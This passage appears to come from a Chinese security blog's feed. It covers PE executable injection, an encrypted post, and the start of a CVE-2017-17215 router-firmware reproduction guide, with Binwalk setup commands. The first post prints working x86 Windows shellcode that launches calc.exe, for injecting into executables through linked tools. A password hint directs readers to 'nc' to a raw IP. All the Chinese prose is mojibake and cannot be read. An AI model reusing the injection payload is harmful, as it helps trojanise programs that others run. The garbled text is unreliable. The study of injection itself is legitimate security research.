æ¨¡å—ï¼ˆdllï¼‰ä¸­çš„å¯¼å‡ºå‡½æ•°çš„ç»“æ„ï¼Œå¦‚æœä¸€ä¸ªæ¨¡å—å¯¼å‡ºäº†å‡½æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°ä¼šè¢«è®°å½•åœ¨å¯¼å‡ºè¡¨ä¸­ï¼Œè¿™æ ·é€šè¿‡GetProcAddresså‡½æ•°å°±èƒ½åŠ¨æ€è·å–åˆ°å‡½æ•°çš„åœ°å€ã€‚</strong></p><p><strong>å¯¼å…¥è¡¨</strong> åœ¨ PE æ–‡ä»¶åŠ è½½æ—¶ï¼Œä¼šæ ¹æ®è¿™ä¸ªè¡¨é‡Œçš„å†…å®¹åŠ è½½ä¾èµ–çš„ DLL ( æ¨¡å— )ï¼Œå¹¶å¡«å……æ‰€éœ€å‡½æ•°çš„åœ°å€ã€‚</p><h3 id="æ³¨å…¥æ€è·¯"><a class="header-anchor" href="#æ³¨å…¥æ€è·¯">Â¶</a>æ³¨å…¥æ€è·¯</h3><p>é¦–å…ˆäº†è§£ï¼ŒPEæ–‡ä»¶ä¸­å¯¼å…¥çš„dllä¿¡æ¯ä»¥ç»“æ„ä½“çš„å½¢å¼å­˜å‚¨åœ¨IDTä¸­ã€‚åªè¦å°†dllæ·»åŠ åˆ°åˆ—è¡¨å°¾éƒ¨å°±å¯ä»¥ã€‚<strong>IMAGE_OPPTIONAL_HEADERç»“æ„ä½“ä¸­å¯¼å…¥è¡¨RVAå³æ˜¯IDTçš„RVAã€‚å¦‚æœå†…å­˜ä¸å¤Ÿï¼Œå°±ç§»åŠ¨IDTã€‚</strong></p><p><a href="https://blog.csdn.net/qq_38204481/article/details/82973582">https://blog.csdn.net/qq_38204481/article/details/82973582</a> IDTç»“æ„è§£æ</p><p>æ³¨å…¥çš„æ‰‹æ®µä¸€åŠæœ‰ä¸¤ç§ï¼š</p><ul><li>å¯»æ‰¾æœ€å¤§çš„ä»£ç ç©ºç™½ï¼Œcave mineï¼Œå°† shellcode å†™å…¥ cave ä¸­ã€‚è¿™ç§æ–¹å¼æ¯”è¾ƒæ–¹ä¾¿ï¼Œç¼ºç‚¹æ˜¯åªé€‚åˆè¾ƒå°çš„  shellcodeï¼Œwindows ä¸Šçš„ shellcode è¦æ¯” linux ä¸Šçš„ shellcode å¤§è®¸å¤šï¼Œè¿™ç§æ–¹å¼çš„æ³›ç”¨æ€§ä¸é«˜ã€‚</li><li>æ–°å¢ PE èŠ‚ï¼Œè¿™ç§æ–¹å¼ä¿®æ”¹ PE æ–‡ä»¶çš„èŠ‚å¤´è¡¨å’ŒèŠ‚ï¼Œå¯ä»¥æ’å…¥ä»»æ„å¤§å°çš„ shellcodeã€‚</li></ul><p>PE æ–‡ä»¶æ³¨å…¥ä¸»è¦åŒ…æ‹¬ä¸¤ä¸ªæ–¹é¢ï¼š</p><ul><li>ç¼–å†™ shellcode</li><li>æ³¨å…¥ shellcode</li></ul><p>æ³¨å…¥ shellcode ç›¸å¯¹æ¯”è¾ƒç®€å•ï¼Œä¸‹é¢ä»‹ç»æ–°å¢ PE èŠ‚å®ç° PE æ³¨å…¥çš„æ–¹æ³•ã€‚</p><h3 id="æ³¨å…¥å®ç°"><a class="header-anchor" href="#æ³¨å…¥å®ç°">Â¶</a>æ³¨å…¥å®ç°</h3><p>æ€è·¯å¤§éƒ½æ˜¯æ·»åŠ èŠ‚ä¹‹ç±»çš„ï¼Œè¿™é‡Œè‡ªå·±æ²¡æœ‰å®ç°ï¼Œæ‰¾äº†ä¸¤ä¸ªé¡¹ç›®ã€‚</p><p><a href="https://github.com/secrary/InfectPE">https://github.com/secrary/InfectPE</a> è¿™ä¸ªæ˜¯æ³¨å…¥peçš„é¡¹ç›®</p><p><a href="https://github.com/hasherezade/pe_to_shellcode/releases">https://github.com/hasherezade/pe_to_shellcode/releases</a> è¿™ä¸ªå¾ˆå¼ºï¼Œè½¬åŒ–peä¸ºshellcode</p><p><a href="https://cloud.tencent.com/developer/article/1597699">https://cloud.tencent.com/developer/article/1597699</a> è¿™æ˜¯pe_to_shellcodeçš„è§£æ</p><p>pe_to_shellcodeè¿™ä¸ªä¸œè¥¿å¾—çœ‹ä»£ç æ‰èƒ½æ‡‚ã€‚</p><p>æ¼”ç¤ºä¸€ä¸‹ç¬¬ä¸€ä¸ªæ³¨å…¥é¡¹ç›®ã€‚</p><p>æ‰‹åŠ¨ç¼–è¯‘äº†ä¸€ä¸ª32ä½çš„é¡¹ç›®</p><p><img src="https://i.bmp.ovh/imgs/2022/06/29/26b87b3f5a5c4140.png" alt=""></p><p>ç„¶ååˆ©ç”¨githubé¡¹ç›®ä¸­çš„exeï¼Œæ‰§è¡Œæ³¨å…¥ï¼Œæ³¨å…¥çš„ä»£ç æ˜¯å¼¹å‡ºä¸€ä¸ªmessagebox</p><p><img src="https://i.bmp.ovh/imgs/2022/06/29/0e334c33e4615565.png" alt=""></p><p>è¿è¡Œbadpe</p><p><img src="https://i.bmp.ovh/imgs/2022/06/29/aee43335a77654f6.png" alt=""></p><p>ç‚¹å‡»ç¡®å®šä¹‹åä¼šæ”¿ç­–æ‰§è¡Œä»£ç ã€‚å¼¹è®¡ç®—å™¨åªéœ€è¦æŠŠæ”¹ä»£ç æ›¿æ¢ä¸ºä¸‹é¢çš„shellcodeå³å¯ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">char</span> sc<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\x50\x53\x51\x52\x56\x57\x55\x89"</span><span class="token string">"\xe5\x83\xec\x18\x31\xf6\x56\x6a"</span><span class="token string">"\x63\x66\x68\x78\x65\x68\x57\x69"</span><span class="token string">"\x6e\x45\x89\x65\xfc\x31\xf6\x64"</span><span class="token string">"\x8b\x5e\x30\x8b\x5b\x0c\x8b\x5b"</span><span class="token string">"\x14\x8b\x1b\x8b\x1b\x8b\x5b\x10"</span><span class="token string">"\x89\x5d\xf8\x31\xc0\x8b\x43\x3c"</span><span class="token string">"\x01\xd8\x8b\x40\x78\x01\xd8\x8b"</span><span class="token string">"\x48\x24\x01\xd9\x89\x4d\xf4\x8b"</span><span class="token string">"\x78\x20\x01\xdf\x89\x7d\xf0\x8b"</span><span class="token string">"\x50\x1c\x01\xda\x89\x55\xec\x8b"</span><span class="token string">"\x58\x14\x31\xc0\x8b\x55\xf8\x8b"</span><span class="token string">"\x7d\xf0\x8b\x75\xfc\x31\xc9\xfc"</span><span class="token string">"\x8b\x3c\x87\x01\xd7\x66\x83\xc1"</span><span class="token string">"\x08\xf3\xa6\x74\x0a\x40\x39\xd8"</span><span class="token string">"\x72\xe5\x83\xc4\x26\xeb\x41\x8b"</span><span class="token string">"\x4d\xf4\x89\xd3\x8b\x55\xec\x66"</span><span class="token string">"\x8b\x04\x41\x8b\x04\x82\x01\xd8"</span><span class="token string">"\x31\xd2\x52\x68\x2e\x65\x78\x65"</span><span class="token string">"\x68\x63\x61\x6c\x63\x68\x6d\x33"</span><span class="token string">"\x32\x5c\x68\x79\x73\x74\x65\x68"</span><span class="token string">"\x77\x73\x5c\x53\x68\x69\x6e\x64"</span><span class="token string">"\x6f\x68\x43\x3a\x5c\x57\x89\xe6"</span><span class="token string">"\x6a\x0a\x56\xff\xd0\x83\xc4\x46"</span><span class="token string">"\x5d\x5f\x5e\x5a\x59\x5b\x58\xc3"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>]]></content>
    
    
    <categories>
      
      <category>others</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windowsææƒ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¥½æ€€ç™¾å²å‡ å›å¼€</title>
    <link href="/2022/06/25/%E5%A5%BD%E6%80%80%E7%99%BE%E5%B2%81%E5%87%A0%E5%9B%9E%E5%BC%80/"/>
    <url>/2022/06/25/%E5%A5%BD%E6%80%80%E7%99%BE%E5%B2%81%E5%87%A0%E5%9B%9E%E5%BC%80/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="å†è¯•è¯•ncçœ‹çœ‹" data-whm="ç¦æ­¢ä¿®æ”¹">  <script id="hbeData" type="hbeData" data-hmacdigest="b0ec96c9e80e113f8a042cf4db3a4cfa5f83f218cde418c1898b44f037ef460c">cc0c0f8ba411acd26894e584ac9b5fda8b1dff880871afe6e43cf0d453c5369626edc82f20db218462ab795b986be0e1e3a75c8aa2169ad7d396023f00d3a0a41178c14531e052334812dce2b1ae5ae142ee68a6bfeb66bf51666b5a727caae0066d137e16b45fc41972d9bd15692c931827903324a77bbe57cea2ba9e154f0e60621540964ec127fd35853155d01d90b332874a0627e8baca858247ff16b47e0aa378a71f11ff40d35f2748d4c240e816e0ec814ecf809fb63203b607816c1c8b9f71bd111dee70c447e1cd19427baf57220568b5d6845756fc1733e2e0385bb15c42fc3d43f448d7af0241f248a1bc0982e56228f84a96ca5a0f695a1754fdf6a78fa70b27bbce0cafe8906c2ac80ce4e6f870a0c2b58c7f21d5e113713c0f8508501836184c7125282a8b3ca9d3288e8c18bbc433c491c88570c3056765a4c52f3637d36b94f522f4741d07598a12c6170e05b4df38438659705eccc049f1e9c17e34ec060bc6bdbbb6c8cc1b6e8b4e7aa0e267f3082753fd222f64615b3dd7e1b974d48780dfda239172fdcc06ac44366a413082e8ab9d5423fd32d86ff1835372e12c3e7459cf196a8001a8a32c331d04fc205eb59c01a108882cd18c82f29dfdd2ef9389e9cdd516820d2d70743d4efa8314fd7784d1c217fca1a02d89f158a16cc2a296c20bb585a3f06d4dc75558ff78aa9e15c3037f8eadf063c2f9fa72caf167ae5f3cc7c7b4bc1793552b46798b8b719c7cdd0923cd0e79292129eb99938a3844f5101c6319876ee93b842a21e7bc3ddcf48c7da3a57f467cac9a82575bfa475c1e90485aa4740270bc9c6cfd213eac8ea17b938f28e3b676c776011c96e0ea7bcd36cd4e80da275940aa745fcacfe69d79e7ffa73798abf20a88b3b00a2100ddf4bf813cbbb370a534c2ea397bc34ebef2059093065e4ce64aa0e6b4ef31eee1000933b3fbe8957f37ae70f8df58df1660dbe76dfd908e4d2f2bc276beb3b82c27a2ff12e9550cdc1e49e95df212fdcc26c7324b41385e75145544d585dd2a5d0ca3bf600432bdd47b9907822c642d8cf220602f6e1842fb4024f50aa80f7b01ff733f638b49bdef1f5159bc93827cba3967cacdc7d350a1f0b2f2aeeb76906b5e7ca59f6224bcc5c3b7f1850d0653685aef8c5957f3e81a5bc8be428fd2ac0dac69a7654c1e3bcc04eb8ddbea81f9343adae78d67e4f676d156396334da06abf31f7ccbd26e1a2bd23fa0422e14d4b85558bc046ce14a4ba950c3c617f00650995b0f5d38ac6c31b21d07e9011998a5f41c5e7854d0aafdd768ef0e04d9b9a4217828e386f1c9fd2080662ab654d4d2538964465a47da7b33ecd52a4b0230ad20235930d74aab1beb541cf98dad488d61c5e6745771538bcda9b389f2a4b062eda503a6c95d145f23bc4774110c600c030dbd837f447df8259eecbb6eb6fa597fe55be156ed963b4c5c3d649a018b138f2772906580959af5766ae47f0bb52864aa7a2baff48c642bb15dba639986e751dfa6c2e59fb773412ade44ac103f139301cd41049a2f853384498783d078fe01681f688d8db7fa9aef7173bbd3cd5fddad8f819ce766487fc7f7bc5e5ded8cbbe04c7056b63181ea2a4ac6a2f6c0070be5550b94af727212ed28ba71c3fe89c6ed48060b516d1d16330d60529421ee57e8c4b23f44e4098eb127008b457df179304612d702739054052c163f7f2908dd8147619ae75ad2a0cea057705497ad1bfa20aae2e94c610671f1acba51b7ec8f411423bb27d6b03a3c8bb8a9972ff3b92f14cad98cac3912293590a727e72722fdcd0819237a74d453d787ac9eb22a31d0266a1413c32c2ec981f5c7699db92d6f30383565088dadc58d179c74bcfaacf5da8649311adeaa1119bfcd00c09fa99b26089b0ac2b5ebe7ab2aed7183805d2d553a46e226db387d63ebe08e2dd04e6d2f7d3990b0fe31c147c214aba30cf13cbb6aafd49d90eba04c743204d248d3eb930043e62c9ed3ad9cfee41ba9da724e7f96b5ce97f6d0d2af21f87651897121f71f6e5819395b71dbfece4015610ce93be9e5c733d16ea128e8b86e8b703adc14c54e9a9bd508c4f7245bd90f344abc914e414677946383f36e0f7cba0214dc1906bfd97e09aa09fd8c9dd765eaf4d036a277587d6a83e77057913c47d519aa7a4e47b3ea7f3c964e868b0dd169311e76578aa7aba67e05fa3c506e404ce1f2f1b16f295dccaf9867250a48ef0ff02cb0c1d0a7686e6ef24a6984f4677cbca7ba29bdc3e929b0bc3576734b278b4fa8fd3380d5d099c03e07fba56f0a15794497a048d3210f862235d6e2f8a516123e751cc2a5d7f498b2d6903a1d523ea1e1414cda393536da2077e603431ef232a31e88f2e350811b97e7bf28da71a4cc42498a78bbcc0f808c30a1b5331d3196767f19e72a616ad4c5dede82ac78c7efbaeeafa2ef209d36810a293dac20496397dc01d56a4b10f14b9e7695b90bf316b350e744b492de9aafa70097a9075554ee0b2a5a8d06d64ea04222269b234c2d4c0d2b54a48659da221fcb6dd205b318eb1cc7ece13b88563b6f627129038d04ff6a6d8322733c83c9037a55f3c8de9a44ba08cbe665bc928e7b8114c593af7fe3c87fec5ce5da9b83786f5cc65972740fea9171a9ecbc02f273a377051589a5bdf60c76e9ba408a089db9bbe826c9ce6c63a65e690a3c2ebb938a9da165e50658dae09d67887df8df813da4107d2880b61c9ffc26a60c41ff4d6a93accb9f67fd469047a75cbba4acc10a49253ee391a967b5e61edd0e26094241146d4393f519908a7e0bee45eba0c352b0ebf35088f6a646f2bf45e4410e56b13398a0ec780b3758f55c7d65f71ea08e98b81a4104f901ed7827f85a0a79b5f946408953d894152df38830e11002532918b9e8d0c20b09530c8b1dd4af8f0d185b9e447ec4f22c48cd4bda5502e4f0a30b14fadf526214ed68bc46e20e0350422654b45c92eb6787b8f071ce87831ad4cf1a4865481f3bd3a213807184118eb14df3c712b88d5d70671bea06ff115373643ec6323f2ba82d21282fc01ec022de936d3caea2f73025e1939ab01b3b9da4f13ca87d78a125ae416ee0e56ed9c656e243719d4db18b95d4fb965f3399df320fcce15622beadde20767e50cbb36d94f926c3b8aaa47a787da6d6c226355a43fcb18d14e1847d740120f861be604382e8c703573404fc9f37c55c2b82bdbfec51edca8f2c83a03bb3680f51161e2cd931dbf2bc116e9fd8b1a3f09bacd5614cba987bb8936c638f7df629a41ab2cc4236cdd3fe5af14c9cdf6c63d14ed81bedb9b395fd923657edaed7bf1565137520586ca4b83378b08827a0807eb377dc42cfaa38ab10768071fc8146ad1d9df149554dc20d5aeff18ca051064d742e9ecc69d53094be759b4c5ecd951c3ccf344449a9e94c6afac622bf13c93f9573aa0debdd5aaa28074eaf5881d181cfc5710835a52fbc40b8d81f2bf880ce4c942a5b483057528bd82d07da86cd2024c6e8cd40af35571faf9336d9474af2c36f98c2e2606235f0bdad9fa6be09342feb759d024ff8409fdcf81a304408a8d67b6790e320b8cae0c528ce94963c1f6921d3049acb7c5fd1231b8bf08d5feac3ef09ee2f9df066d2075d28f17e2febca6878ca5cd8d96268b4f77fbdab02d0981951523e9c76c7e7da51a5a2f4b05af48832c7e0e68d838592906c1e4ce43450fc82e4da4be36282defd01265dda6316bb211e12ec1077d0ae2d78ebc273f93136b81a33db4d454947ed017767705510c8e3d6ad4e6db09900d914511549892365fc4d5b5250cb1392e62adfe84c4537278e62cf9a089371df054c1a9a176be20be83d19a45ee9355d8f6a9624e5db5a3104a648b7603763506f62caf20fcc6739341ae430cb25fa9f84e1a6ac9df9dfac2e0ea743b054463350f6e8ce1805bb02928d9096cac369864f7924ffc57b7b81508f94da63dade05d420acd29c97d27f92af237442f581e1b9a2a96411c351213a32c0ad633a52eaa8d0cac9ef8ff26e9bc8015043c3106ef06d6a1e95a0bc3a3b1d7754fb40bc0c2c4ea4b554709d7db4ff40def2d6552f5aa0715a57880c74d8cbe84d0742ebb2e29b1dc9e00fb2d70e6946eabcde357ec30cb72098f9fa36b96af64ce99a43efceb2708a0ad21a34f9d6e500da54d6b6c6c4e5fb970b42ef6f8e04bc75fe0581bd5bb2cb5018506cac5be19e1cbf6056969a0b069668d38b4e281fec92b45b2086ff74a5aea0828877627071efac78dc10a6d7c3666afa4af742a217475c6f6c3e92c447ad734956b2c96a515243cb82f03cc3a40f668cd3aa651c956b5a83fef491a49a396156782122f8031bc4c6fbb628871c357edaf58e64d902f429d0cbee1756b0b4010e40e3e0cfa1d40e1d5c6e1a27f39544946c73976fed2054aa4be0b9cd24a56e356f53f287c17500c5321b0b2e6260d41b2a4503dd88d1189de3ab34a5efbfcc4f1183be262de5adc7b526dda1af343cc1606b09ef2227cb1d38586aef4ffc9451f0c6d80243fa956b02a0238f3bb3d092fdc2242c1f834f64810a142ec3d5133045686976036a25166124315fb0598394c28ed792eae98ce5206b7186d9041edddb4051c323a2f311dbebd1ea9f6559472ebba42d02780f2cbdd83bf1d4eb743576177b3f797a343ad44d2128b94d33a6f1a9fe0f59d761f75ac7ac7d041ea89aa8ee3b2a07c61acddfa00b0a95caa73300ac9268503f3f5a2a0fc7f44c96b1d04cac3e8220d913357281dc3562c09ddb5de59f9690b16fb9fed0cc20eb2be8b367748a7d26ebef78a2ff5d966aed212b1c5dc794e4b15871c5c7b5ca8ea8ff465c0477a021ab66c9c58e82ca6529c39581b053c8347e2e1c74cca1b7552f3e0d55786e0f111827a2f3b11b6be60b512e304967775ad9aa69e57e43b327a925416c2f74971c3247fa95465ba60ae8397ac0ff5c2cf4ecf5e678b30b4218db4df805afc57df270e7af42cd623fd50e2b302b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">chat nc 43.96.147.93</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>chats</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2017-17215å¤ç°</title>
    <link href="/2022/06/23/CVE-2017-17215%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/06/23/CVE-2017-17215%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡é¦–å‘äºåˆå¤©ç½‘å®‰å®éªŒå®¤ï¼Œé“¾æ¥æ—¶é—´å¤ªä¹…å¿˜äº†ã€‚</p></blockquote><p>ğŸ˜ˆè¿œå¤æ—¶æœŸå­¦ä¹ è·¯ç”±å™¨å›ºä»¶åˆ†æï¼Œå¹¶å°è¯•å¤ç°äº†ä¸€ä¸ªç®€å•çš„CVEã€‚ä¸­é—´é‡åˆ°äº†å¾ˆå¤šçš„å‘ç‚¹ï¼Œè™½ç„¶æŠŠæ¼æ´å¤ç°äº†ï¼Œä½†æ˜¯è¿‡ç¨‹å¯è°“æ›²æŠ˜ã€‚</p><p>psï¼šè¯¥æ–‡ç« ä»¥å¤ç°CVE-2017-17215ä¸ºåŸºç¡€ï¼Œæä¾›ä¸€ä¸ªè¯¦ç»†çš„å›ºä»¶åˆ†æå…¥é—¨æ‰‹å†Œã€‚</p><h2 id="0x01-ç¯å¢ƒå‡†å¤‡"><a class="header-anchor" href="#0x01-ç¯å¢ƒå‡†å¤‡">Â¶</a>0x01 ç¯å¢ƒå‡†å¤‡</h2><p>ç¯å¢ƒå‡†å¤‡æ˜¯åˆ†æå›ºä»¶çš„åŸºç¡€ã€‚æ‰‹é‡Œçš„ç¯å¢ƒæ˜¯ubuntu20ï¼Œä¸­é—´ä¹Ÿå°è¯•è¿‡è¿‡kali2020ã€‚<strong>æœŸé—´å°è¯•è¿‡è‡ªåŠ¨åŒ–å·¥å…·Firmadyneï¼Œä»¥åŠå…¶plusç‰ˆæœ¬</strong>ï¼Œä½†æ˜¯éƒ½å¤±è´¥äº†ï¼Œè¿™é‡Œä¸€äº›å¸ˆå‚…é‚£é‡Œå¾—åˆ°å»ºè®®ï¼ŒFirmadyneå·¥å…·çš„é•œåƒå’Œå†…æ ¸å¤ªè€äº†ï¼Œå»ºè®®æ‰‹åŠ¨æ¢æ–°çš„ï¼Œæ­¤å¤–è¯¥è‡ªåŠ¨åŒ–åˆ†æå·¥å…·å…¶å®ä¹Ÿæœ‰è¾ƒå¤§çš„å±€é™æ€§ï¼Œæ‰€ä»¥æˆ‘å»ºè®®<strong>æ‰‹åŠ¨é…ç½®ä¸€ä¸ªå›ºä»¶æ¨¡æ‹Ÿç¯å¢ƒååˆ†æœ‰å¿…è¦</strong></p><p>ä¸‹é¢æ˜¯ç¯å¢ƒçš„é…ç½®è¿‡ç¨‹ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">ubuntu20 python2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h3 id="Binwalkå®‰è£…"><a class="header-anchor" href="#Binwalkå®‰è£…">Â¶</a>Binwalkå®‰è£…</h3><p>Binwalkæ˜¯ä¸€æ¬¾ä¼˜ç§€çš„å›ºä»¶æå–å·¥å…·ï¼Œæˆ‘ä»¬æ‹¿åˆ°æ‰‹çš„ï¼Œéœ€è¦åˆ†æçš„å›ºä»¶å¤§éƒ½æ˜¯binæ–‡ä»¶ï¼Œè¿™æ—¶å€™BInwalkå·¥å…·å°±èµ·åˆ°äº†ä»ä¸­åˆ†æå‡ºæ–‡ä»¶ç³»ç»Ÿçš„ä½œç”¨ã€‚</p><p><strong>aptä¸‹è½½çš„å’Œkaliè‡ªå¸¦çš„Binwalk</strong>ç¼ºå°‘éƒ¨åˆ†é‡è¦çš„åˆ†ææ’ä»¶ï¼Œå»ºè®®æ‰‹åŠ¨ç¼–è¯‘å®‰è£…ï¼Œé¿å…å›ºä»¶åˆ†æå¤±è´¥ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> remove binwalk  //å¦‚æœæœ‰çš„è¯ï¼Œå…ˆåˆ é™¤æ—§ç‰ˆçš„Binwalk<span class="token function">git</span> clone https://github.com/devttys0/binwalk //ä»gitä¸Šè·å–binwalk<span class="token builtin class-name">cd</span> binwalk<span class="token function">sudo</span> python3 setup.py <span class="token function">install</span> //Binwalkä½¿ç”¨python3ç¼–è¯‘å®‰è£…//å¦‚æœæ˜¯python2ç¯å¢ƒï¼Œå°±éœ€è¦å…ˆå®‰è£…ä»¥ä¸‹ä¾èµ–<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python-lzma<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>å¦‚æœgitå‡ºç°é—®é¢˜å¯ä»¥å°è¯•æŠŠ<code>https://</code>æ”¹æˆ<code>git://</code>ï¼Œç­‰å¾…ç¼–è¯‘å®Œæ¯•å³å¯å®ŒæˆBinwalkçš„å®‰è£…ã€‚</p><p>ç„¶åå®‰è£…ä¸€äº›å…¶ä»–çš„ä¾èµ–ã€‚<br>Binwalk uses the pycrypto library to decrypt some known encrypted firmware images:<br>Binwalkæä¾›åˆ†æä¸€äº›åŠ å¯†å›ºä»¶çš„æ’ä»¶ï¼Œä½†æ˜¯ç”¨åˆ°äº†pycryptoåº“ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜è¦å†å®‰è£…ä¸€ä¸‹è¯¥åº“ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Python2.7</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python-crypto<span class="token comment"># Python3.x </span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python3-crypto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>Binwalkæä¾›å›¾ç‰‡å’Œè§†è§‰åˆ†æã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Python2.7</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libqt4-opengl python-opengl python-qt4 python-qt4-gl python-numpy python-scipy python-pip<span class="token function">sudo</span> pip <span class="token function">install</span> pyqtgraph <span class="token comment"># Python3.x</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libqt4-opengl python3-opengl python3-pyqt4 python3-pyqt4.qtopengl python3-numpy python3-scipy python3-pip<span class="token function">sudo</span> pip3 <span class="token function">install</span> pyqtgraph<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>Capstone disassembly frameworkçš„æ’ä»¶è¿è¡Œéœ€è¦çš„pythonæ¨¡å—å¦‚ä¸‹ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Python2.7</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python-pip<span class="token function">sudo</span> pip <span class="token function">install</span> capstone<span class="token comment"># Python3.x </span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python3-pip<span class="token comment"># Install standard extraction utilitie</span>$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> mtd-utils <span class="token function">gzip</span> <span class="token function">bzip2</span> <span class="token function">tar</span> arj lhasa p7zip p7zip-full cabextract cramfsprogs cramfsswap squashfs-tools<span class="token comment"># Install sasquatch to extract non-standard SquashFS image</span>$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> zlib1g-dev liblzma-dev liblzo2-dev  $ <span class="token function">git</span> clone https://github.com/devttys0/sasquatch  $ <span class="token punctuation">(</span>cd sasquatch <span class="token operator">&amp;&amp;</span> ./build.sh<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>ä»¥ä¸‹çš„é€‰æ‹©æ€§å®‰è£…å³å¯ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Install jefferson to extract JFFS2 file systems</span>$ <span class="token function">sudo</span> pip <span class="token function">install</span> cstruct$ <span class="token function">git</span> clone https://github.com/sviehb/jefferson$ <span class="token punctuation">(</span>cd jefferson <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> python setup.py <span class="token function">install</span><span class="token punctuation">)</span>  <span class="token comment"># Install ubi_reader to extract UBIFS file systems</span>$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> liblzo2-dev python-lzo$ <span class="token function">git</span> clone https://github.com/jrspruitt/ubi_reader$ <span class="token punctuation">(</span>cd ubi_reader <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> python setup.py <span class="token function">install</span><span class="token punctuation">)</span>  <span class="token comment"># Install yaffshiv to extract YAFFS file systems</span>$ <span class="token function">git</span> clone https://github.com/devttys0/yaffshiv$ <span class="token punctuation">(</span>cd yaffshiv <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> python setup.py <span class="token function">install</span><span class="token punctuation">)</span>  <span class="token comment"># Install unstuff (closed source) to extract StuffIt archive files</span>$ <span class="token function">wget</span> -O - http://my.smithmicro.com/downloads/files/stuffit520.611linux-i386.tar.gz <span class="token operator">|</span> <span class="token function">tar</span> -zxv$ <span class="token function">sudo</span> <span class="token function">cp</span> bin/unstuff /usr/local/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>ä»¥ä¸Šæ˜¯æ‰‹åŠ¨å®‰è£…æ‰€æœ‰åº“çš„è¿‡ç¨‹ï¼Œå¦‚æœæƒ³è¦çœæ—¶é—´ï¼Œä¹Ÿå¯ä»¥å°è¯•ä¸€ä¸‹Binwalkçš„å®‰è£…æ–‡ä»¶å¤¹ä¸­çš„è‡ªåŠ¨å®‰è£…è„šæœ¬ï¼Œ<code>sudo ./deps.sh</code>ï¼Œä½†æ˜¯è¿™æ ·çš„å®‰è£…è€—æ—¶è¾ƒé•¿ï¼Œä¸”å®¹æ˜“æŠ¥é”™ï¼Œå»ºè®®è¿˜æ˜¯é‡‡ç”¨æ‰‹åŠ¨å®‰è£…éœ€è¦çš„å‡ ä¸ªä¾èµ–å³å¯ã€‚</p><p>å®‰è£…å¥½äº†ä¹‹åï¼Œå¯ä»¥å°è¯•ä¸€ä¸‹åˆ†æå›ºä»¶ã€‚<br><code>binwalk -Me å›ºä»¶</code><br><img src="https://i.bmp.ovh/imgs/2022/01/7ad77b1b981aee35.png" alt=""></p><p><img src="https://i.bmp.ovh/imgs/2022/01/20586cf2af94373f.png" alt=""></p><p>åœ¨å½“å‰çš„æ–‡ä»¶å¤¹ä¸‹å³å¯å¾—åˆ°æ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•ã€‚<br>é€šè¿‡<code>file 